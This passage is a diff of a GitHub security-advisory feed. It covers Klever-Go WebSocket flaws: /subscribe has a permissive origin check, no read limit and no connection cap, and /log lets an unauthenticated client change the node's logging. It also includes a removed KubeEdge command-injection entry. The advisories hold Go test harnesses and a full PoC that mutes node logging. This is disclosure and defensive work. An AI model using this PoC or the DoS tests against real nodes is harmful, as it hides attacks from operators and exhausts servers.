+    gin.SetMode(gin.ReleaseMode)
+    engine := gin.New()
+    up := gorilla.Upgrader{CheckOrigin: func(r *http.Request) bool {
+        return r.Header.Get("Origin") == "" // strict: only same/no-origin allowed
+    }}
+    engine.GET("/subscribe", func(c *gin.Context) {
+        conn, err := up.Upgrade(c.Writer, c.Request, nil)
+        if err != nil {
+            return
+        }
+        conn.SetReadLimit(1 &lt;&lt; 20) // 1 MiB cap (the fix)
+        go func() {
+            defer conn.Close()
+            for {
+                if _, _, err := conn.ReadMessage(); err != nil {
+                    return
+                }
+            }
+        }()
+    })
+    ln, _ := net.Listen("tcp", "127.0.0.1:0")
+    srv := &amp;http.Server{Handler: engine}
+    go func() { _ = srv.Serve(ln) }()
+    return ln.Addr().String(), func() { _ = srv.Close(); _ = ln.Close() }
+}
+
+func bigValidSubscribeJSON(addrBytes int) []byte {
+    // valid subscribe frame: one giant attacker-controlled address string
+    return []byte(`{"subscribed_types":["accounts"],"addresses":["` + strings.Repeat("A", addrBytes) + `"]}`)
+}
+
+// GAP #1 — permissive origin: real handler accepts an evil Origin; hardened rejects it.
+func TestE2E_Gap1_EvilOriginAccepted(t *testing.T) {
+    realAddr, stopReal := startRealSubscribeServer(t)
+    defer stopReal()
+    hardAddr, stopHard := startHardenedSubscribeServer(t)
+    defer stopHard()
+
+    hdr := http.Header{"Origin": []string{"https://evil.attacker.example"}}
+
+    cReal, respReal, errReal := gorilla.DefaultDialer.Dial("ws://"+realAddr+"/subscribe", hdr)
+    if errReal != nil {
+        t.Fatalf("REAL handler REJECTED evil origin (status %v) — not vulnerable", respReal)
+    }
+    _ = cReal.Close()
+    t.Logf("GAP#1 CONFIRMED: real /subscribe accepted Origin=https://evil.attacker.example (HTTP %d)", respReal.StatusCode)
+
+    cHard, respHard, errHard := gorilla.DefaultDialer.Dial("ws://"+hardAddr+"/subscribe", hdr)
+    if errHard == nil {
+        _ = cHard.Close()
+        t.Fatalf("hardened control unexpectedly accepted evil origin")
+    }
+    t.Logf("control: hardened handler rejected evil origin (HTTP %d) as expected", respHard.StatusCode)
+}
+
+// GAP #2 — no read-size limit: real handler reads a frame far over any sane WS limit;
+// the hardened control (SetReadLimit 1 MiB) closes the connection with 1009 on the same frame.
+func TestE2E_Gap2_NoReadSizeLimit(t *testing.T) {
+    realAddr, stopReal := startRealSubscribeServer(t)
+    defer stopReal()
+    hardAddr, stopHard := startHardenedSubscribeServer(t)
+    defer stopHard()
+
+    const big = 8 &lt;&lt; 20 // 8 MiB single frame (&gt;&gt; typical 1 MiB cap; tiny enough not to OOM the runner)
+    frame := bigValidSubscribeJSON(big)
+
+    // --- hardened control: must reject (close 1009 "message too big") ---
+    cHard, _, err := gorilla.DefaultDialer.Dial("ws://"+hardAddr+"/subscribe", nil)
+    if err != nil {
+        t.Fatalf("dial hardened: %v", err)
+    }
+    _ = cHard.WriteMessage(gorilla.TextMessage, frame)
+    cHard.SetReadDeadline(time.Now().Add(3 * time.Second))
+    _, _, errHard := cHard.ReadMessage()
+    _ = cHard.Close()
+    if ce, ok := errHard.(*gorilla.CloseError); ok &amp;&amp; ce.Code == gorilla.CloseMessageTooBig {
+        t.Logf("control: hardened handler rejected %d-byte frame with close 1009 (read limit works)", big)
+    } else {
+        t.Logf("control note: hardened returned %v (expected close 1009)", errHard)
+    }
+
+    // --- REAL handler: reads the whole 8 MiB frame; connection NOT closed for size ---
+    var m0, m1 runtime.MemStats
+    runtime.GC()
+    runtime.ReadMemStats(&amp;m0)
+
+    cReal, _, err := gorilla.DefaultDialer.Dial("ws://"+realAddr+"/subscribe", nil)
+    if err != nil {
+        t.Fatalf("dial real: %v", err)
+    }
+    if err := cReal.WriteMessage(gorilla.TextMessage, frame); err != nil {
+        t.Fatalf("write big frame to real: %v", err)
+    }
+    // Give the server time to ReadJSON the full frame + insert the giant address.
+    time.Sleep(400 * time.Millisecond)
+    runtime.ReadMemStats(&amp;m1)
+
+    // The real handler must NOT have closed us with 1009. Probe with a short read.
+    cReal.SetReadDeadline(time.Now().Add(1 * time.Second))
+    _, _, rerr := cReal.ReadMessage()
+    _ = cReal.Close()
+    if ce, ok := rerr.(*gorilla.CloseError); ok &amp;&amp; ce.Code == gorilla.CloseMessageTooBig {
+        t.Fatalf("REAL handler enforced a read limit (close 1009) — NOT vulnerable")
+    }
+
+    t.Logf("GAP#2 CONFIRMED: real /subscribe accepted an %d-byte (8 MiB) frame with NO size limit "+
+        "(no close 1009; read err=%v). Server heap grew ~%d MiB while buffering one attacker frame.",
+        big, rerr, int64(m1.HeapAlloc-m0.HeapAlloc)/(1&lt;&lt;20))
+
+}
+
+// GAP #3 (connection level) — no per-connection / per-IP / global cap on live WS connections.
+// Open many concurrent real connections from one client; the real server accepts them all and
+// spawns 2 goroutines + a 500-buffered channel each (uncounted by the gin global throttler,
+// whose slot is released right after the HTTP-&gt;WS upgrade). Measured via goroutine growth.
+func TestE2E_Gap3_NoConnectionCap(t *testing.T) {
+    realAddr, stopReal := startRealSubscribeServer(t)
+    defer stopReal()
+
+    const n = 300 // modest; enough to show no cap without stressing the runner
+    g0 := runtime.NumGoroutine()
+    conns := make([]*gorilla.Conn, 0, n)
+    accepted := 0
+    for i := 0; i &lt; n; i++ {
+        c, _, err := gorilla.DefaultDialer.Dial("ws://"+realAddr+"/subscribe", nil)
+        if err != nil {
+            t.Logf("connection %d rejected: %v", i, err)
+            break
+        }
+        // send a valid subscribe so the server promotes it to a live hub client
+        _ = c.WriteMessage(gorilla.TextMessage, []byte(`{"subscribed_types":["blocks"],"addresses":[]}`))
+        conns = append(conns, c)
+        accepted++
+    }
+    time.Sleep(300 * time.Millisecond)
+    g1 := runtime.NumGoroutine()
+    for _, c := range conns {
+        _ = c.Close()
+    }
+
+    if accepted &lt; n {
+        t.Fatalf("server applied a connection cap at %d (&lt;%d) — would weaken the finding", accepted, n)
+    }
+    t.Logf("GAP#3 CONFIRMED (conn level): real /subscribe accepted ALL %d concurrent connections from one client "+
+        "with NO cap (global throttler=100 not enforced on live WS). Server goroutines grew %d -&gt; %d (~%d per conn).",
+        accepted, g0, g1, (g1-g0)/n)
+}
+</code></pre>
+<h2 id="suggested-fix">Suggested Fix</h2>
+<p>Address each gap; they are independent and all should be fixed regardless of API binding.</p>
+<ul>
+<li><p>GAP #2 (read-size) — set an explicit read limit on every accepted WS connection, before any read,
+in both read paths (<code>processSubscription</code> and <code>client.loopIn</code>):</p>
+<pre><code class="language-go">const maxWSMessageSize = 1 &lt;&lt; 20 // 1 MiB; tune to the largest legitimate subscribe payload
+conn.SetReadLimit(maxWSMessageSize)
+</code></pre>
+<p>gorilla then closes oversized frames with close 1009 instead of buffering unbounded memory.</p>
+</li>
+<li><p>GAP #3 (connection / fan-out cap):</p>
+<ul>
+<li>Cap concurrent WS connections globally and per source IP with a dedicated limiter that is held
+for the WS lifetime (the gin global throttler cannot do this — its slot is released at the
+HTTP→WS upgrade). Reject (HTTP 503 / close) beyond the cap.</li>
+<li>Bound <code>len(req.Addresses)</code> and the total per-connection subscription count to a sane maximum;
+reject or truncate beyond it in <code>HandleClientInsertion</code> / <code>processSubscription</code>.</li>
+</ul>
+</li>
+<li><p>GAP #1 (origin) — replace <code>CheckOrigin: func(...) bool { return true }</code> with an allowlist driven by
+config (same-origin and explicitly trusted origins only). This removes the cross-origin drive-by
+reach to localhost-bound nodes (Impact D).</p>
+</li>
+<li><p>Defense-in-depth — keep a read deadline active for the lifetime of the connection (the current code
+clears it via <code>SetReadDeadline(time.Time{})</code> after the first read), so an idle/slow connection
+cannot pin resources indefinitely.</p>
+</li>
+</ul>
+<h2 id="duplicate-check-vs-published-advisories">Duplicate Check (vs published advisories)</h2>
+<p>Checked against <a href="https://github.com/klever-io/klever-go/security/advisories">https://github.com/klever-io/klever-go/security/advisories</a> (3 published):</p>
+<ul>
+<li>GHSA-jc6w-wmfc-fh33 / CVE-2026-46403 (Medium) — KVM read-only exec commits delete/upgrade side effects.</li>
+<li>GHSA-87m7-qffr-542v / CVE-2026-44697 (High) — <code>MultiDataInterceptor</code> OOM via crafted compressed P2P payload.</li>
+<li>GHSA-74m6-4hjp-7226 (High) — <code>MultiDataInterceptor</code> throttler-slot leak on malformed compressed batches.</li>
+</ul>
+<p>This finding is NOT a duplicate:</p>
+<ul>
+<li>Different component — REST/WebSocket API (<code>network/api/websocket</code>, <code>websocket/</code>), not the P2P
+interceptor pipeline or the KVM.</li>
+<li>Different mechanism — missing WS read-size limit + uncounted live connections + permissive origin
+(CWE-770/1385), not gzip decompression blow-up, not throttler-slot accounting, not VM read-only isolation.</li>
+<li>The advisory texts contain no mention of <code>/subscribe</code>, <code>SetReadLimit</code>, <code>CheckOrigin</code>,
+<code>addressSubscription</code>, <code>SocketHub</code>, or <code>processSubscription</code>.</li>
+<li>The three advisories' fixes ARE present in the reviewed tree (<code>MaxDecompressedBatchSize</code>,
+<code>ownershipTransferred</code> throttler guard, <code>runtime.ReadOnly()</code> delete/upgrade checks), confirming the
+tree is at/after <code>v1.7.17</code>, yet the <code>/subscribe</code> gaps remain unpatched at HEAD <code>23b74e1</code>.</li>
+<li>It is adjacent in impact CLASS to 87m7/74m6 (remote DoS), referenced here for context only.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/klever-io/klever-go/security/advisories/GHSA-4fwh-wrm6-97xm">https://github.com/klever-io/klever-go/security/advisories/GHSA-4fwh-wrm6-97xm</a></li>
+<li><a href="https://github.com/klever-io/klever-go/pull/76">https://github.com/klever-io/klever-go/pull/76</a></li>
+<li><a href="https://github.com/klever-io/klever-go/commit/b8af922e749ec1fa7451b2c6e7c9f634d8603be2">https://github.com/klever-io/klever-go/commit/b8af922e749ec1fa7451b2c6e7c9f634d8603be2</a></li>
+<li><a href="https://github.com/klever-io/klever-go/releases/tag/v1.7.20">https://github.com/klever-io/klever-go/releases/tag/v1.7.20</a></li>
+<li><a href="https://github.com/advisories/GHSA-4fwh-wrm6-97xm">https://github.com/advisories/GHSA-4fwh-wrm6-97xm</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-4fwh-wrm6-97xm</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-09-23T19:16:40.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/klever-io/klever-go] Klever-Go: /log controls global node logging]]></title>
+        <id>https://github.com/advisories/GHSA-9v8p-frvj-2pcm</id>
+        <link href="https://github.com/advisories/GHSA-9v8p-frvj-2pcm"/>
+        <updated>2026-09-23T19:13:47.000Z</updated>
+        <content type="html"><![CDATA[<p>An unauthenticated client can connect to <code>GET /log</code>, send an arbitrary logger profile as the first WebSocket message, and mutate the node's global logging configuration before receiving live logs from the process. I confirmed this against a local validator built from this repository: an unauthenticated client set the global log level to <code>*:NONE</code>, the node accepted the profile, and the node stopped emitting normal slot logs while the WebSocket connection remained open.</p>
+<p>This is not a duplicate of the published KVM or P2P advisories. It is a management-plane flaw in the public WebSocket logging endpoint.</p>
+<h2 id="vulnerability-details">Vulnerability details</h2>
+<h3 id="affected-code">Affected code</h3>
+<ul>
+<li>Route exposed by default in <code>config/node/api.yaml</code></li>
+<li>Route registration in <code>network/api/api.go</code></li>
+<li>Unauthenticated upgrade in <code>network/api/api.go</code></li>
+<li>First client message is parsed as a logger profile and applied globally in <code>network/api/logs/logSender.go</code></li>
+<li>Global logger mutation happens in dependency <code>github.com/klever-io/klever-go-logger</code>, <code>profile.go</code>, <code>Apply()</code></li>
+</ul>
+<h3 id="root-cause">Root cause</h3>
+<p><code>/log</code> is enabled by default and does not require authentication. After the WebSocket upgrade, the server reads the first client message and treats it as a logger <code>Profile</code>. That profile is then applied process-wide through <code>profile.Apply()</code>, which changes global log level patterns and output formatting options for the whole node.</p>
+<p>After that handshake, the same unauthenticated connection is registered as a log observer and receives live logs from the running process.</p>
+<h2 id="reproduction-steps">Reproduction steps</h2>
+<h3 id="environment">Environment</h3>
+<ul>
+<li>Validator built from the repository at commit <code>9640d63265e910e166dfa694c8e5ddeb53018ffd</code></li>
+<li>REST API bound locally for validation</li>
+<li>Tested on 2026-05-30</li>
+</ul>
+<h3 id="step-1-build-and-run-a-local-validator-from-source">Step 1: Build and run a local validator from source</h3>
+<pre><code class="language-bash">cd &lt;repo-root&gt;
+
+go build -o ./bin/validator ./cmd/node
+
+./bin/validator \
+  --rest-api-interface=127.0.0.1:18080 \
+  --port=18083 \
+  --config=./config/node/config.yaml \
+  --config-api=./config/node/api.yaml \
+  --config-epochs=./config/node/enableEpochs.yaml \
+  --config-gas-schedule=./config/node/gasScheduleV1.yaml \
+  --config-external=./config/node/external.yaml \
+  --genesis-file=./config/node/genesis.json \
+  --nodes-setup-file=./config/node/nodesSetup.json \
+  --working-directory=./validator-report-run \
+  --use-log-view
+</code></pre>
+<p>The node exposes <code>GET /log</code> and a plain HTTP request already shows it is a live WebSocket endpoint:</p>
+<pre><code class="language-bash">curl -i http://127.0.0.1:18080/log
+</code></pre>
+<p>Observed response:</p>
+<pre><code class="language-http">HTTP/1.1 400 Bad Request
+Sec-Websocket-Version: 13
+</code></pre>
+<h3 id="step-2-confirm-normal-node-logging-before-the-attack">Step 2: Confirm normal node logging before the attack</h3>
+<p>Before the attack, the validator emits periodic slot logs such as:</p>
+<pre><code class="language-text">#################################### SLOT 14 BEGINS ####################################
+#################################### SLOT 15 BEGINS ####################################
+</code></pre>
+<h3 id="step-3-connect-to-log-without-authentication-and-apply-a-global-mute-profile">Step 3: Connect to <code>/log</code> without authentication and apply a global mute profile</h3>
+<p>Run the PoC file:</p>
+<pre><code class="language-bash">cd &lt;repo-root&gt;
+go run ./poc-log-profile-control.go \
+  -url ws://127.0.0.1:18080/log \
+  -profile none \
+  -hold 12s
+</code></pre>
+<p>Full PoC source:</p>
+<pre><code class="language-go">package main
+
+import (
+    "flag"
+    "fmt"
+    "log"
+    "time"
+
+    "github.com/gorilla/websocket"
+)
+
+func main() {
+    url := flag.String("url", "ws://127.0.0.1:18080/log", "WebSocket log endpoint")
+    profile := flag.String("profile", "none", "Profile to send: none or trace")
+    hold := flag.Duration("hold", 12*time.Second, "How long to keep the socket open")
+    flag.Parse()
+
+    payload := `{"LogLevelPatterns":"*:NONE","WithCorrelation":false,"WithLoggerName":false}`
+    switch *profile {
+    case "trace":
+        payload = `{"LogLevelPatterns":"*:TRACE","WithCorrelation":true,"WithLoggerName":true}`
+    case "none":
+    default:
+        log.Fatalf("unsupported profile %q", *profile)
+    }
+
+    c, _, err := websocket.DefaultDialer.Dial(*url, nil)
+    if err != nil {
+        log.Fatalf("dial: %v", err)
+    }
+    defer c.Close()
+
+    fmt.Printf("connected to %s\n", *url)
+    fmt.Printf("sending payload: %s\n", payload)
+
+    if err := c.WriteMessage(websocket.TextMessage, []byte(payload)); err != nil {
+        log.Fatalf("write payload: %v", err)
+    }
+
+    fmt.Printf("holding connection open for %s\n", hold.String())
+    time.Sleep(*hold)
+    fmt.Println("closing connection")
+}
+</code></pre>
+<p>Save the PoC as <code>poc-log-profile-control.go</code> in the repository root, or run it from any directory with access to the Go module cache.</p>
+<h3 id="step-4-observe-the-validator-accepts-and-applies-the-unauthenticated-profile">Step 4: Observe the validator accepts and applies the unauthenticated profile</h3>
+<p>While the PoC is connected, the validator prints:</p>
+<pre><code class="language-text">websocket log profile received  profile = [pattern=*:NONE, with correlation=false, with logger name=false]
+</code></pre>
+<h3 id="step-5-observe-logging-is-suppressed-while-the-attacker-connection-remains-open">Step 5: Observe logging is suppressed while the attacker connection remains open</h3>
+<p>In my local reproduction, the validator emitted:</p>
+<pre><code class="language-text">SLOT 14 BEGINS
+websocket log profile received profile = [pattern=*:NONE, ...]
+reverted log profile profile = [pattern=*:INFO, ...]
+SLOT 18 BEGINS
+</code></pre>
+<p>The expected slot logs for the interval while <code>*:NONE</code> was active did not appear. This proves that an unauthenticated client can suppress process logs globally while the WebSocket remains connected.</p>
+<h3 id="step-6-observe-the-profile-is-restored-only-after-the-attacker-disconnects">Step 6: Observe the profile is restored only after the attacker disconnects</h3>
+<p>After the PoC closes the WebSocket, the validator prints:</p>
+<pre><code class="language-text">reverted log profile  profile = [pattern=*:INFO, with correlation=false, with logger name=false]
+</code></pre>
+<p>The revert happens because the server stores the previous profile and restores it only on disconnect. During the lifetime of the attacker connection, the attacker-controlled profile remains active.</p>
+<h2 id="impact">Impact</h2>
+<p>An unauthenticated attacker can:</p>
+<ul>
+<li>read live process logs over <code>/log</code></li>
+<li>mute node logging completely with <code>*:NONE</code></li>
+<li>increase verbosity to <code>*:TRACE</code> and force noisy logging</li>
+<li>toggle correlation and logger-name settings process-wide</li>
+</ul>
+<p>This affects both confidentiality and operational integrity.</p>
+<p>In the reproduced case, the attacker hid normal validator slot logs for multiple slot intervals. In real deployments, logs commonly contain operational details, peer information, error traces, and occasionally secrets or credentials emitted by adjacent components. Even when no secrets are present, the ability to suppress or distort logs from the public network is a meaningful security impact because it degrades detection, incident response, and operator visibility while an attacker is active.</p>
+<p>This issue is distinct from:</p>
+<ul>
+<li><code>GHSA-jc6w-wmfc-fh33</code> (KVM read-only execution side effects)</li>
+<li><code>GHSA-87m7-qffr-542v</code> (MultiDataInterceptor remote OOM)</li>
+<li><code>GHSA-74m6-4hjp-7226</code> (MultiDataInterceptor throttler slot leak)</li>
+</ul>
+<p>Those are VM/P2P-path flaws. This finding is an unauthenticated management-plane flaw in the WebSocket logging endpoint.</p>
+<h2 id="recommended-fix">Recommended fix</h2>
+<h3 id="immediate">Immediate</h3>
+<ul>
+<li>Remove <code>/log</code> from the default <code>open: true</code> route set.</li>
+<li>Require authentication before upgrading the WebSocket.</li>
+<li>Reject unauthenticated clients before any profile message is processed.</li>
+</ul>
+<h3 id="short-term">Short term</h3>
+<ul>
+<li>Do not apply client-provided logger profiles to the process-global logger.</li>
+<li>If remote log viewing is required, allow only a fixed server-side profile or a strict allowlist of safe settings.</li>
+<li>Enforce origin checks and, if possible, bind <code>/log</code> to localhost-only or a dedicated admin interface.</li>
+</ul>
+<h3 id="long-term">Long term</h3>
+<ul>
+<li>Separate log streaming from global logger configuration.</li>
+<li>Move any profile mutation capability behind an authenticated admin-only channel with explicit authorization and audit logging.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/klever-io/klever-go/security/advisories/GHSA-9v8p-frvj-2pcm">https://github.com/klever-io/klever-go/security/advisories/GHSA-9v8p-frvj-2pcm</a></li>
+<li><a href="https://github.com/klever-io/klever-go/pull/74">https://github.com/klever-io/klever-go/pull/74</a></li>
+<li><a href="https://github.com/klever-io/klever-go/commit/a2740c985a788fb69e17742ea4f0c37c440733b2">https://github.com/klever-io/klever-go/commit/a2740c985a788fb69e17742ea4f0c37c440733b2</a></li>
+<li><a href="https://github.com/klever-io/klever-go/releases/tag/v1.7.20">https://github.com/klever-io/klever-go/releases/tag/v1.7.20</a></li>
+<li><a href="https://github.com/advisories/GHSA-9v8p-frvj-2pcm">https://github.com/advisories/GHSA-9v8p-frvj-2pcm</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-9v8p-frvj-2pcm</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-09-23T19:13:46.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[Traefik] Traefik: BasicAuth singleflight coalescing reintroduces an unauthenticated username-enumeration timing oracle]]></title>
         <id>https://github.com/advisories/GHSA-8fcf-v89g-xpg6</id>
@@ -1749,239 +2602,6 @@ ok  	github.com/steveiliop56/tinyauth/internal/controller	0.067s
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-09-22T20:37:08.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/kubeedge/kubeedge] KubeEdge: Command Injection in NodeUpgradeJob - RCE on edge nodes via v1alpha2 API]]></title>
-        <id>https://github.com/advisories/GHSA-5jpj-293f-rhvj</id>
-        <link href="https://github.com/advisories/GHSA-5jpj-293f-rhvj"/>
-        <updated>2026-09-22T20:37:06.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
-<p>The KubeEdge NodeUpgradeJob handler constructed the <code>keadm upgrade edge</code> command by concatenating the user-controlled <code>spec.version</code> and <code>spec.image</code> fields into a shell command.</p>
-<p>An authenticated user with permission to create or update <code>NodeUpgradeJob</code> resources through the v1alpha2 API could include shell metacharacters in either field. When the upgrade job was processed, the injected command could be executed on the targeted edge node with the privileges available to the upgrade process.</p>
-<p>Successful exploitation could result in arbitrary command execution and compromise the confidentiality, integrity, and availability of the affected edge node.</p>
-<h2 id="patches">Patches</h2>
-<p>The fix removes shell-based command construction and invokes <code>keadm</code> using a structured argument list through <code>exec.Command</code>.</p>
-<p>The version and image values are passed as separate literal arguments and are no longer interpreted by a command shell.</p>
-<p>The fixed versions:</p>
-<ul>
-<li>KubeEdge v1.23.1</li>
-<li>KubeEdge v1.22.2</li>
-<li>KubeEdge v1.21.2</li>
-</ul>
-<h2 id="workarounds">Workarounds</h2>
-<p>Until a patched version is available:</p>
-<ul>
-<li>restrict permission to create or update <code>NodeUpgradeJob</code> resources to trusted administrators;</li>
-<li>do not allow untrusted users or tenants to control the <code>spec.version</code> or <code>spec.image</code> fields;</li>
-<li>avoid using NodeUpgradeJob-based edge upgrades in environments where these fields may be influenced by untrusted users.</li>
-</ul>
-<h2 id="credits">Credits</h2>
-<p>KubeEdge thanks Sang-Hoon Choi (<a href="https://github.com/KoreaSecurity">KoreaSecurity</a>, Sejong University)
-for responsibly reporting this issue and for coordinating with the KubeEdge
-maintainers through the security disclosure process.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/kubeedge/kubeedge/security/advisories/GHSA-5jpj-293f-rhvj">https://github.com/kubeedge/kubeedge/security/advisories/GHSA-5jpj-293f-rhvj</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-62371">https://nvd.nist.gov/vuln/detail/CVE-2026-62371</a></li>
-<li><a href="https://github.com/kubeedge/kubeedge/pull/7028">https://github.com/kubeedge/kubeedge/pull/7028</a></li>
-<li><a href="https://github.com/kubeedge/kubeedge/pull/7029">https://github.com/kubeedge/kubeedge/pull/7029</a></li>
-<li><a href="https://github.com/kubeedge/kubeedge/pull/7030">https://github.com/kubeedge/kubeedge/pull/7030</a></li>
-<li><a href="https://github.com/kubeedge/kubeedge/commit/552af457a4c7ce80ea1678ab5889f475b36ea103">https://github.com/kubeedge/kubeedge/commit/552af457a4c7ce80ea1678ab5889f475b36ea103</a></li>
-<li><a href="https://github.com/kubeedge/kubeedge/commit/657b745bebcdd7a221eb34c0aac13231ef12c37f">https://github.com/kubeedge/kubeedge/commit/657b745bebcdd7a221eb34c0aac13231ef12c37f</a></li>
-<li><a href="https://github.com/kubeedge/kubeedge/commit/b72db7f8a0f7be23261b4349eab33024b2007df0">https://github.com/kubeedge/kubeedge/commit/b72db7f8a0f7be23261b4349eab33024b2007df0</a></li>
-<li><a href="https://github.com/kubeedge/kubeedge/blob/master/CHANGELOG/CHANGELOG-1.21.md">https://github.com/kubeedge/kubeedge/blob/master/CHANGELOG/CHANGELOG-1.21.md</a></li>
-<li><a href="https://github.com/kubeedge/kubeedge/blob/master/CHANGELOG/CHANGELOG-1.22.md">https://github.com/kubeedge/kubeedge/blob/master/CHANGELOG/CHANGELOG-1.22.md</a></li>
-<li><a href="https://github.com/kubeedge/kubeedge/blob/master/CHANGELOG/CHANGELOG-1.23.md">https://github.com/kubeedge/kubeedge/blob/master/CHANGELOG/CHANGELOG-1.23.md</a></li>
-<li><a href="https://github.com/kubeedge/kubeedge/releases/tag/v1.21.2">https://github.com/kubeedge/kubeedge/releases/tag/v1.21.2</a></li>
-<li><a href="https://github.com/kubeedge/kubeedge/releases/tag/v1.22.2">https://github.com/kubeedge/kubeedge/releases/tag/v1.22.2</a></li>
-<li><a href="https://github.com/kubeedge/kubeedge/releases/tag/v1.23.1">https://github.com/kubeedge/kubeedge/releases/tag/v1.23.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-5jpj-293f-rhvj">https://github.com/advisories/GHSA-5jpj-293f-rhvj</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-5jpj-293f-rhvj</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-09-22T20:37:04.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/kubeedge/kubeedge] KubeEdge: Command Injection in NodeUpgradeJob - RCE on edge nodes via v1alpha2 API]]></title>
-        <id>https://github.com/advisories/GHSA-5jpj-293f-rhvj</id>
-        <link href="https://github.com/advisories/GHSA-5jpj-293f-rhvj"/>
-        <updated>2026-09-22T20:37:06.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
-<p>The KubeEdge NodeUpgradeJob handler constructed the <code>keadm upgrade edge</code> command by concatenating the user-controlled <code>spec.version</code> and <code>spec.image</code> fields into a shell command.</p>
-<p>An authenticated user with permission to create or update <code>NodeUpgradeJob</code> resources through the v1alpha2 API could include shell metacharacters in either field. When the upgrade job was processed, the injected command could be executed on the targeted edge node with the privileges available to the upgrade process.</p>
-<p>Successful exploitation could result in arbitrary command execution and compromise the confidentiality, integrity, and availability of the affected edge node.</p>
-<h2 id="patches">Patches</h2>
-<p>The fix removes shell-based command construction and invokes <code>keadm</code> using a structured argument list through <code>exec.Command</code>.</p>
-<p>The version and image values are passed as separate literal arguments and are no longer interpreted by a command shell.</p>
-<p>The fixed versions:</p>
-<ul>
-<li>KubeEdge v1.23.1</li>
-<li>KubeEdge v1.22.2</li>
-<li>KubeEdge v1.21.2</li>
-</ul>
-<h2 id="workarounds">Workarounds</h2>
-<p>Until a patched version is available:</p>
-<ul>
-<li>restrict permission to create or update <code>NodeUpgradeJob</code> resources to trusted administrators;</li>
-<li>do not allow untrusted users or tenants to control the <code>spec.version</code> or <code>spec.image</code> fields;</li>
-<li>avoid using NodeUpgradeJob-based edge upgrades in environments where these fields may be influenced by untrusted users.</li>
-</ul>
-<h2 id="credits">Credits</h2>
-<p>KubeEdge thanks Sang-Hoon Choi (<a href="https://github.com/KoreaSecurity">KoreaSecurity</a>, Sejong University)
-for responsibly reporting this issue and for coordinating with the KubeEdge
-maintainers through the security disclosure process.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/kubeedge/kubeedge/security/advisories/GHSA-5jpj-293f-rhvj">https://github.com/kubeedge/kubeedge/security/advisories/GHSA-5jpj-293f-rhvj</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-62371">https://nvd.nist.gov/vuln/detail/CVE-2026-62371</a></li>
-<li><a href="https://github.com/kubeedge/kubeedge/pull/7028">https://github.com/kubeedge/kubeedge/pull/7028</a></li>
-<li><a href="https://github.com/kubeedge/kubeedge/pull/7029">https://github.com/kubeedge/kubeedge/pull/7029</a></li>
-<li><a href="https://github.com/kubeedge/kubeedge/pull/7030">https://github.com/kubeedge/kubeedge/pull/7030</a></li>
-<li><a href="https://github.com/kubeedge/kubeedge/commit/552af457a4c7ce80ea1678ab5889f475b36ea103">https://github.com/kubeedge/kubeedge/commit/552af457a4c7ce80ea1678ab5889f475b36ea103</a></li>
-<li><a href="https://github.com/kubeedge/kubeedge/commit/657b745bebcdd7a221eb34c0aac13231ef12c37f">https://github.com/kubeedge/kubeedge/commit/657b745bebcdd7a221eb34c0aac13231ef12c37f</a></li>
-<li><a href="https://github.com/kubeedge/kubeedge/commit/b72db7f8a0f7be23261b4349eab33024b2007df0">https://github.com/kubeedge/kubeedge/commit/b72db7f8a0f7be23261b4349eab33024b2007df0</a></li>
-<li><a href="https://github.com/kubeedge/kubeedge/blob/master/CHANGELOG/CHANGELOG-1.21.md">https://github.com/kubeedge/kubeedge/blob/master/CHANGELOG/CHANGELOG-1.21.md</a></li>
-<li><a href="https://github.com/kubeedge/kubeedge/blob/master/CHANGELOG/CHANGELOG-1.22.md">https://github.com/kubeedge/kubeedge/blob/master/CHANGELOG/CHANGELOG-1.22.md</a></li>
-<li><a href="https://github.com/kubeedge/kubeedge/blob/master/CHANGELOG/CHANGELOG-1.23.md">https://github.com/kubeedge/kubeedge/blob/master/CHANGELOG/CHANGELOG-1.23.md</a></li>
-<li><a href="https://github.com/kubeedge/kubeedge/releases/tag/v1.21.2">https://github.com/kubeedge/kubeedge/releases/tag/v1.21.2</a></li>
-<li><a href="https://github.com/kubeedge/kubeedge/releases/tag/v1.22.2">https://github.com/kubeedge/kubeedge/releases/tag/v1.22.2</a></li>
-<li><a href="https://github.com/kubeedge/kubeedge/releases/tag/v1.23.1">https://github.com/kubeedge/kubeedge/releases/tag/v1.23.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-5jpj-293f-rhvj">https://github.com/advisories/GHSA-5jpj-293f-rhvj</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-5jpj-293f-rhvj</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-09-22T20:37:04.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/tinyauthapp/tinyauth] Tinyauth: User enumeration attack by timing oracle]]></title>
-        <id>https://github.com/advisories/GHSA-456h-ww26-f758</id>
-        <link href="https://github.com/advisories/GHSA-456h-ww26-f758"/>
-        <updated>2026-09-22T20:37:06.000Z</updated>
